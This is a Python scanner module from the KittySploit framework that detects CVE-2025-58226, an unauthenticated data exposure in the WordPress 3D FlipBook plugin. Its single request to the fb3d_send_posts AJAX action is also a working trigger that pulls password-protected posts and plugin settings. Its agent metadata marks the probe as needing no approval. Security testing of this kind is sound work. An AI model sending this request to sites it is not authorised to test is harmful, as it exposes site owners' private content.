#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The 3D FlipBook WordPress plugin (≤ v1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress 3D FlipBook Plugin <= 1.16.17 - Sensitive Information Exposure Detection',
        'description': 'The 3D FlipBook WordPress plugin (≤ v1.16.17) has a vulnerability where an unauthenticated AJAX action (fb3d_send_posts) exposes sensitive data. Attackers can access all flipbook posts—including password-protected content, metadata, PDF URLs, and plugin settings—without authorization.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'wordpress', 'wp-plugin', '3d-flipbook', 'exposure', 'unauth'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/interactive-3d-flipbook-powered-physics-engine/',
            'https://patchstack.com/database/wordpress/plugin/interactive-3d-flipbook-powered-physics-engine/vulnerability/...',
            'https://plugins.svn.wordpress.org/interactive-3d-flipbook-powered-physics-engine/',
        ],
        'cve': 'CVE-2025-58226',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-admin/admin-ajax.php?action=fb3d_send_posts', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('"code":', '"posts":', '"title":', '"post_type":"3d-flip-book"',)
        header_any = ('application/json',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="WordPress 3D FlipBook Plugin <= 1.16.17 - Sensitive Information Exposure detected",
                path='/wp-admin/admin-ajax.php?action=fb3d_send_posts',
            )
            return True
        return False

